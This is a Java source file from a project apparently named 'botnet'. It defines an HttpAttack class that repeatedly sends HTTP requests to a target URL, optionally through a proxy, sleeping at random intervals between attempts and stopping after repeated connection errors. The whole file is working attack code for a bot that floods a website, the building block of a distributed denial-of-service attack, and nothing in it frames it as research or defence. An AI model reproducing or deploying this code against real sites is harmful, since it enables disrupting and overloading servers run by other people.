/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.attack;

import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.tool.net.HttpManager;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Duration;
import com.acmutv.botnet.tool.time.Interval;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NonNull;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

/**
 * This class realizes the behaviour of a HTTP attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see HttpTarget
 */
@Data
@AllArgsConstructor
public class HttpAttack implements Attacker {

  protected static final Logger LOGGER = LogManager.getLogger(HttpAttack.class);

  /**
   * Max number of connection failure before attack interruption.
   */
  private static final long MAX_ERRORS= 10;

  public HttpAttack(HttpMethod method, HttpTarget target) {
    this(method, target, null);
  }

  public HttpAttack(HttpMethod method, HttpTarget target, HttpProxy proxy) {
    this(method, target, proxy, new HashMap<>());
  }

  /**
   * The HTTP request method.
   */
  @NonNull
  private HttpMethod method;

  /**
   * The target to attack.
   */
  @NonNull
  private HttpTarget target;

  /**
   * The proxy to attack by.
   */
  private HttpProxy proxy;

  /**
   * The HTTP request properties.
   */
  @NonNull
  private Map<String,String> properties = new HashMap<>();

  /**
   * Executes the attack lifecycle.
   */
  @Override
  public void run() {
    final URL url = this.getTarget().getUrl();
    final long maxAttempts = this.getTarget().getMaxAttempts();
    final Interval period = this.getTarget().getPeriod();

    long errors = 0;

    for (long i = 0; i < maxAttempts; i++) {
      try {
        LOGGER.info("Launching HTTP attack: {} {} with proxy {} ({}/{})",
            this.getMethod(), url, this.getProxy().address(), i, maxAttempts);
        this.makeAttack(url);
      } catch (IOException exc) {
        errors ++;
        LOGGER.error("Cannot execute the attack (error {}/{}): {}",
            errors, MAX_ERRORS, exc.getMessage());
        if (errors >= MAX_ERRORS) {
          LOGGER.info("Max number of connection errors reached, aborting ...");
          LOGGER.traceExit();
          return;
        }
      }
      final long sleepAmount =
          ThreadLocalRandom.current().nextLong(period.getMin(), period.getMax());
      final Duration timeout = new Duration(sleepAmount, period.getUnit());
      this.sleep(timeout);
    }
  }

  /**
   * Executes the attack.
   * @param url the target to attack.
   * @throws IOException when the target is not reachable.
   */
  public void makeAttack(final URL url) throws IOException {
    LOGGER.traceEntry("url={}", url);

    final int response = HttpManager.makeRequest(this.getMethod(), url, this.getProperties(), this.getProxy());

    LOGGER.info("Attack response :: {} {} :: {}", this.getMethod(), url, response);
  }

  /**
   * Pauses the attacker.
   * @param timeout pause duration.
   */
  private void sleep(final Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    try {
      timeout.getUnit().sleep(timeout.getAmount());
    } catch (InterruptedException exc) {
      LOGGER.trace(exc.getMessage());
    }
    LOGGER.traceExit();
  }
}
